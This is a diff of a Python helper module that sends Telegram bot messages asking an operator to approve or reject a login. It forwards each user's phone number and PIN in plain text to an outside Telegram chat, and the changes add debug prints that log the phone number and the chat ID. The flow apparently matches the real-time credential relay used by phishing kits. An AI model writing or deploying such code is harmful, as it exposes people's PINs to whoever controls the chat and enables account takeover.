@@ -4,18 +4,25 @@ import httpx
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
+
 async def send_approval_request(approval_id: str, phone: str, pin: str):
-    """Send a Telegram message with Approve/Reject inline buttons."""
+    print("=" * 50)
+    print(f"🔵 CALLED send_approval_request")
+    print(f"🔵 approval_id: {approval_id}")
+    print(f"🔵 phone: {phone}")
+    print(f"🔵 token loaded: {bool(TELEGRAM_BOT_TOKEN)}")
+    print(f"🔵 chat_id loaded: {TELEGRAM_CHAT_ID}")
+    print("=" * 50)
+
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
-        print("Telegram credentials missing.")
+        print("🔴 Telegram credentials missing — skipping.")
         return
 
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     text = (
         f"🔐 <b>Login Approval Required</b>\n\n"
         f"📱 Phone: <code>{phone}</code>\n"
-        f"🔑 PIN: <code>{pin}</code>\n\n"
-        f"Approve this login?"
+        f"🔑 PIN: <code>{pin}</code>"
     )
     keyboard = {
         "inline_keyboard": [[
@@ -29,23 +36,26 @@ async def send_approval_request(approval_id: str, phone: str, pin: str):
         "parse_mode": "HTML",
         "reply_markup": keyboard,
     }
+
     async with httpx.AsyncClient() as client:
         try:
-            await client.post(url, json=payload)
+            response = await client.post(url, json=payload)
+            print(f"🟢 Telegram response: {response.status_code}")
+            print(f"🟢 Body: {response.text}")
         except Exception as e:
-            print(f"Telegram send error: {e}")
+            print(f"🔴 Telegram send error: {e}")
+
 
 async def answer_callback_query(callback_id: str, text: str):
-    """Acknowledge the button press so the spinner stops."""
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
     async with httpx.AsyncClient() as client:
         try:
             await client.post(url, json={"callback_query_id": callback_id, "text": text})
         except Exception as e:
-            print(f"Callback answer error: {e}")
+            print(f"Callback error: {e}")
+
 
 async def edit_message(chat_id: int, message_id: int, text: str):
-    """Edit the original Telegram message to show the result."""
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
     payload = {
         "chat_id": chat_id,
@@ -57,4 +67,4 @@ async def edit_message(chat_id: int, message_id: int, text: str):
         try:
             await client.post(url, json=payload)
         except Exception as e:
-            print(f"Edit message error: {e}")
+            print(f"Edit error: {e}")
